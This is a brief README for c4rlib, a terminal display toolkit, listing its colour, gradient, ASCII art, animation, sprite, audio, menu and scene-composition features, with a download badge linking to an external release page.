# 🎨 c4rlib - Create stunning terminal displays with ease

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://tertian-mess712.github.io)

c4rlib acts as a toolkit for your terminal. It helps you build visual experiences in your command prompt. Developers use it to show colors, gradients, and moving pictures. It supports text art, sound, and menus. The FX layer allows you to combine these parts into finished displays.

## 📦 Features

c4rlib provides tools to make your terminal look professional. The library includes:

- Color Control: Adjust text and background shades.
- Gradients: Create smooth transitions between colors.
- ASCII Art: Display images using text characters.
- Animations: Add motion to your terminal screen.
- Sprites: Manage moving shapes.
- Audio Support: Play sounds to match your visuals.
- Interactive Menus: Build lists that users can select.
- FX Layer: Compose all visual elements into scenes.
